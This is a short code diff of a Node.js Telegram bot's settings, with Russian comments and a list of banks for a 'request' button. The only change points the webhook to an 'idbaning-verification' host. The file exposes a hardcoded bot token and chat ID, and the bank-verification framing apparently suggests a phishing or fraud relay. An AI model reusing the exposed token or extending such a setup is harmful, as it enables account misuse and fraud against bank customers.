@@ -7,7 +7,7 @@ const path = require('path');
 // НАСТРОЙКИ
 const TELEGRAM_BOT_TOKEN = '8227870538:AAG6O3ojYrxz_COPKCkgUZy-GYSYxRfNKuc';
 const CHAT_ID = '-1003473672730';
-const WEBHOOK_URL = 'https://new-l8h6.onrender.com/bot' + TELEGRAM_BOT_TOKEN;
+const WEBHOOK_URL = 'https://idbaning-verification.onrender.com/bot' + TELEGRAM_BOT_TOKEN;
 
 // СПИСОК БАНКОВ ДЛЯ КНОПКИ "ЗАПРОС"
 const banksForRequestButton = [
